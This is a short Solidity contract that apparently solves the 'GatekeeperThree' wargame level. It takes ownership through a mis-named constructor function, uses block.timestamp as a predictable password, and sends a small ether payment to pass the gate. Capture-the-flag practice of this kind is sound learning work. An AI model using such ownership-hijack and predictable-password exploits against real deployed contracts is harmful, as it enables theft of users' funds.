// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../levels/GatekeeperThree.sol';

contract GatekeeperThreeAttack {
    GatekeeperThree public gatekeeperThree;

    constructor (address payable _gatekeeperThree) payable {
        gatekeeperThree = GatekeeperThree(_gatekeeperThree);
    }
    
    function attack() public {
        // Take ownership
        gatekeeperThree.construct0r();
        // Set pasword block.timmestamp
        gatekeeperThree.createTrick();
        // Set allow_entrance = true
        gatekeeperThree.getAllowance(block.timestamp);
        // Enter
        payable(address(gatekeeperThree)).transfer(0.0011 ether);     
        gatekeeperThree.enter();
    }
}